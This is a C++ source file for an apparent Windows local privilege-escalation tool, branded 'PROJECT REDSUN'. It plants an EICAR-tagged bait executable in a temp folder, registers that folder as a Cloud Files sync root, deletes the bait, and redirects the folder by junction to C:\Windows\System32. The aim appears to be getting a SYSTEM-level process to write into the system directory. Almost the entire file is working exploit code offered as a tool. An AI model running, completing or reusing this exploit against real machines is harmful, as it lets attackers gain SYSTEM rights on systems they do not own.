#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <cfapi.h>
#include <winioctl.h>
#include <iostream>
#include <string>
#include <memory>
#include <vector>

#pragma comment(lib, "synchronization.lib")
#pragma comment(lib, "CldApi.lib")

// --- Launcher Visuals ---
void SetConsoleStyle() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTitleW(L"REDTEAM - PROJECT REDSUN v2.6");
    // Matrix Green text on Black
    SetConsoleTextAttribute(hOut, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
}

void PrintHeader() {
    std::wcout << L"__________________________________________________________" << std::endl;
    std::wcout << L"  _____  ______ _____   _____ _    _ _   _              " << std::endl;
    std::wcout << L" |  __ \\|  ____|  __ \\ / ____| |  | | \\ | |             " << std::endl;
    std::wcout << L" | |__) | |__  | |  | | (___ | |  | |  \\| |             " << std::endl;
    std::wcout << L" |  _  /|  __| | |  | |\\___ \\| |  | | . ` |             " << std::endl;
    std::wcout << L" | | \\ \\| |____| |__| |____) | |__| | |\\  |             " << std::endl;
    std::wcout << L" |_|  \\_\\______|_____/|_____/ \\____/|_| \\_|             " << std::endl;
    std::wcout << L"__________________________________________________________" << std::endl;
    std::wcout << L" [Internal Use Only] - Security Researcher: Joey         " << std::endl;
    std::wcout << L"__________________________________________________________\n" << std::endl;
}

// --- RAII & Logic (The "Super Code") ---
class SmartHandle {
    HANDLE h_;
public:
    explicit SmartHandle(HANDLE h = INVALID_HANDLE_VALUE) : h_(h) {}
    ~SmartHandle() { if (h_ != INVALID_HANDLE_VALUE && h_ != NULL) CloseHandle(h_); }
    HANDLE get() const { return h_; }
    HANDLE* ptr() { return &h_; }
    bool isValid() const { return h_ != INVALID_HANDLE_VALUE && h_ != NULL; }
};

class CloudConnection {
    CF_CONNECTION_KEY key_;
    bool connected_ = false;
public:
    ~CloudConnection() { if (connected_) CfDisconnectSyncRoot(key_); }
    CF_CONNECTION_KEY* keyPtr() { return &key_; }
    void setConnected(bool state) { connected_ = state; }
};

bool CreateJunction(const std::wstring& dir, const std::wstring& target) {
    SmartHandle hDir(CreateFileW(dir.c_str(), GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL));

    if (!hDir.isValid()) return false;

    std::wstring ntTarget = L"\\??\\" + target;
    DWORD targetByteLen = (DWORD)(ntTarget.length() * sizeof(wchar_t));
    DWORD bufSize = FIELD_OFFSET(REPARSE_DATA_BUFFER, MountPointReparseBuffer.PathBuffer) + targetByteLen + 4;

    auto buffer = std::make_unique<BYTE[]>(bufSize);
    PREPARSE_DATA_BUFFER rdb = reinterpret_cast<PREPARSE_DATA_BUFFER>(buffer.get());

    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    rdb->ReparseDataLength = (USHORT)(targetByteLen + 12);
    rdb->MountPointReparseBuffer.SubstituteNameLength = (USHORT)targetByteLen;
    rdb->MountPointReparseBuffer.PrintNameOffset = (USHORT)(targetByteLen + 2);

    memcpy(rdb->MountPointReparseBuffer.PathBuffer, ntTarget.c_str(), targetByteLen);
    DWORD bytesReturned;
    return DeviceIoControl(hDir.get(), FSCTL_SET_REPARSE_POINT, rdb, bufSize, NULL, 0, &bytesReturned, NULL);
}

int main() {
    SetConsoleStyle();
    PrintHeader();

    std::wcout << L"[*] Analyzing environment..." << std::endl;
    Sleep(800);

    // 1. Privilege Check
    SmartHandle token;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, token.ptr());
    DWORD sz = 0;
    GetTokenInformation(token.get(), TokenUser, NULL, 0, &sz);
    auto buf = std::make_unique<BYTE[]>(sz);
    PTOKEN_USER user = (PTOKEN_USER)buf.get();

    if (GetTokenInformation(token.get(), TokenUser, user, sz, &sz) && IsWellKnownSid(user->User.Sid, WinLocalSystemSid)) {
        std::wcout << L"[!] SUCCESS: Process already has SYSTEM identity." << std::endl;
        std::wcout << L"[!] Exiting to prevent redundant execution." << std::endl;
        system("pause");
        return 0;
    }

    std::wcout << L"[*] Target identified: NT AUTHORITY\\SYSTEM" << std::endl;
    std::wcout << L"[*] Initializing Cloud-Junction pivot..." << std::endl;

    // 2. Execution Path
    wchar_t tmp[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    std::wstring workDir = std::wstring(tmp) + L"Redsun_Stage";
    CreateDirectoryW(workDir.c_str(), NULL);

    std::wstring bait = L"diag_svc.exe";
    std::wstring baitPath = workDir + L"\\" + bait;

    SmartHandle hBait(CreateFileW(baitPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
    if (hBait.isValid()) {
        const char* payload = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
        DWORD written;
        WriteFile(hBait.get(), payload, (DWORD)strlen(payload), &written, NULL);
    }

    {
        CloudConnection conn;
        CF_SYNC_REGISTRATION reg = { sizeof(reg) };
        reg.ProviderName = L"RedsunProvider";
        reg.ProviderVersion = L"1.0";
        CF_SYNC_POLICIES pol = { sizeof(pol) };
        pol.HardLink = CF_HARDLINK_POLICY_ALLOWED;
        pol.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;

        if (SUCCEEDED(CfRegisterSyncRoot(workDir.c_str(), &reg, &pol, CF_REGISTER_FLAG_NONE))) {
            CF_CALLBACK_REGISTRATION cb[] = { { CF_CALLBACK_TYPE_NONE, NULL } };
            if (SUCCEEDED(CfConnectSyncRoot(workDir.c_str(), cb, NULL, CF_CONNECT_FLAG_NONE, conn.keyPtr()))) {
                conn.setConnected(true);

                std::wcout << L"[*] Pivot armed. Deleting bait..." << std::endl;
                DeleteFileW(baitPath.c_str());

                if (CreateJunction(workDir, L"C:\\Windows\\System32")) {
                    std::wcout << L"[+] REDIRECT ACTIVE: " << workDir << L" -> System32" << std::endl;
                }
            }
        }
    }

    std::wcout << L"\n[*] Stage 1 Complete. Awaiting System Callback..." << std::endl;
    std::wcout << L"__________________________________________________________" << std::endl;
    system("pause");
    return 0;
}
